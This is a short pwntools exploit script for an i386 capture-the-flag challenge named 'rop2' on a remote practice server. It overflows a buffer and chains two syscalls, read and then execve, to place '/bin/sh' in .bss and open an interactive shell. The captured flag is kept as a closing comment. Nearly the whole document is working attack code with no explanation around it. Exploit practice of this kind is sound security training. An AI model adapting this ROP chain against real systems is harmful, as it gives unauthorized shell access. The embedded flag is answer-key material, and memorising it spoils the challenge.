from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
elf = ELF('/home/zander/Desktop/ctf/rop2')
bss_addr = elf.bss()
syscall_addr = 0x080484FF # call    _syscall in main

ret_addr = 0xffffcfac
i_addr = 0xffffcf9c

shellcode = "/bin/sh\0"

payload = 'a' * (ret_addr - i_addr)
payload += p32(syscall_addr)
payload += p32(3)
payload += p32(0)
payload += p32(bss_addr)
payload += p32(len(shellcode))

payload2 = 'a' * (ret_addr - i_addr)
payload2 += p32(syscall_addr)
payload2 += p32(11)
payload2 += p32(bss_addr)
payload2 += p32(0)
payload2 += p32(0)

# p = process('/home/zander/Desktop/ctf/rop2')
p = remote('hackme.inndy.tw', 7703)
p.recvuntil('Can you solve this?\nGive me your ropchain:')
p.sendline(payload)
p.readline()
p.send(shellcode)
p.readline()
p.sendline(payload2)

p.interactive()
p.close()

# FLAG{Wow, you really know how to ROP!!!...V2rhMIjGNYqQ3Uyx}